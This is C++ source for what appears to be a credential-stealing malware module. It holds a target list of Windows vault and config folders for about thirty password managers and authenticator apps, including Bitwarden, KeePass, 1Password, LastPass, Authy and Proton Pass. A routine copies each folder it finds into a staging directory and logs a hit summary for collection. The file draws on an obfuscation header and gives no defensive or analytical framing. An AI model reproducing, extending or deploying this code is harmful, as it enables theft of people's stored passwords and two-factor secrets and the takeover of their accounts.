// Password managers: vaults, configs and local caches.
#include "../modules.h"
#include "../config.h"
#include "../core/obf.h"
#include "../core/sys.h"
#include <sstream>

namespace {

struct PmTarget { const char* name; const char* path; const char* pattern; };

const PmTarget k_pms[] = {
    {"Bitwarden", "%APPDATA%\\Bitwarden", "*"},
    {"Bitwarden local", "%LOCALAPPDATA%\\Bitwarden", "*"},
    {"Bitwarden (packages)", "%LOCALAPPDATA%\\Packages\\8bitSolutionsLLC.bitwardendesktop_h4e712dmw3xyy\\LocalState", "*"},
    {"KeePass", "%APPDATA%\\KeePass", "*"},
    {"KeePassXC", "%APPDATA%\\KeePassXC", "*"},
    {"KeePass (docs)", "%USERPROFILE%\\Documents", "*.kdbx"},
    {"1Password", "%LOCALAPPDATA%\\1Password", "*"},
    {"1Password roaming", "%APPDATA%\\1Password", "*"},
    {"1Password opvault", "%USERPROFILE%\\1Password", "*.opvault"},
    {"LastPass", "%LOCALAPPDATA%\\LastPass", "*"},
    {"Dashlane", "%APPDATA%\\Dashlane", "*"},
    {"Dashlane local", "%LOCALAPPDATA%\\Dashlane", "*"},
    {"RoboForm", "%APPDATA%\\Siber Systems\\AI RoboForm", "*"},
    {"RoboForm data", "%USERPROFILE%\\Documents\\RoboForm", "*"},
    {"NordPass", "%APPDATA%\\NordPass", "*"},
    {"NordPass local", "%LOCALAPPDATA%\\NordPass", "*"},
    {"Keeper", "%APPDATA%\\Keeper", "*"},
    {"Keeper local", "%LOCALAPPDATA%\\Keeper", "*"},
    {"Enpass", "%LOCALAPPDATA%\\Enpass", "*"},
    {"Password Depot", "%APPDATA%\\Password Depot", "*"},
    {"Sticky Password", "%APPDATA%\\Sticky Password", "*"},
    {"SplashID", "%APPDATA%\\SplashID", "*"},
    {"Zoho Vault", "%APPDATA%\\Zoho\\Vault", "*"},
    {"Padlock", "%APPDATA%\\Padlock", "*"},
    {"Passman", "%APPDATA%\\Passman", "*"},
    {"Buttercup", "%APPDATA%\\Buttercup", "*"},
    {"SafeInCloud", "%APPDATA%\\SafeInCloud", "*"},
    {"Authy", "%APPDATA%\\Authy", "*"},
    {"Authy local", "%LOCALAPPDATA%\\Authy", "*"},
    {"2FAS", "%APPDATA%\\2FAS", "*"},
    {"Aegis", "%APPDATA%\\Aegis", "*"},
    {"Proton Pass", "%APPDATA%\\Proton Pass", "*"},
};

} // namespace

namespace mod {

void pwmanagers(const std::string& staging) {
    std::ostringstream summary;
    int hits = 0;
    for (auto& p : k_pms) {
        std::string path = util::expand_env(p.path);
        if (path.empty() || !util::path_exists(path)) continue;
        hits++;
        util::copy_dir_recursive(path, util::join(staging, "pwmanagers\\" + std::string(p.name)),
                                 {p.pattern}, 64 * 1024 * 1024);
        summary << "  " << p.name << ": " << path << "\r\n";
    }
    stage::stage_text("pwmanagers", "_summary.txt", summary.str());
    stage::note("pwmanagers", std::to_string(hits) + " managers found");
}

} // namespace mod
